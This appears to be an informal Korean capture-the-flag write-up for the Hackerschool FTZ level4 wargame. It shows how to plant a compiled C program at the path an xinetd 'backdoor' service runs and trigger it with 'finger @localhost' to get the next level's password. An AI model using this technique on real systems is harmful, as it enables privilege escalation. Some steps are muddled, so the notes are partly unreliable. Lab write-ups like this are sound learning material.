# Hackserschool FTZ level4
---
- 앞에서 했던 것 처럼 hint를 보면 누군가                
    /etc/xinetd.d/에 백도어를 심어놓았다.!  

- 그래서 위의 주소로 들어가서  
>$ cd /etc/xinetd.d
>>여기서 xinetd는 서비스에 접속할시 사용자의 정보를 확인하는 곳..
>>>xinetd.d는 xinetd에서 제공할 서비스를 모아두는 디렉토리
>
>$ ls

안에 디렉토리나 파일들을 보면 
backdoor가 있다.
- backdoor가 실행도안되고 cd도 안되니 cat으로 파일을 확인 해보앗더니 
~~~
server = /home/level4/tmp/backdoor
~~~

- 그래서 
>$ cd /home/level4/tmp/backdoor
한뒤 
이곳에서 
>$ ls-al

를 하니 아무것도 없었다.

그래서 vim으로 코드를 짜서 실해하면 되지않을까?
>$ vim backdoor.c

~~~c
#include <stdio.h>
#include <stdlib.h>
int main(){
    system("my-pass");
    return 0;
}
~~~
 이렇게 하면 되지않을까?

 >$ gcc -o backdoor backdoor.c 
컴파일하면

>Level4 Password is ~~~~~~~

level4주소가나온다???

그러므로 finger @localhost를 사용하면 위의 xinetd.d의 backdoor 가 실행될것이다.

그러면 답이나옴.. 
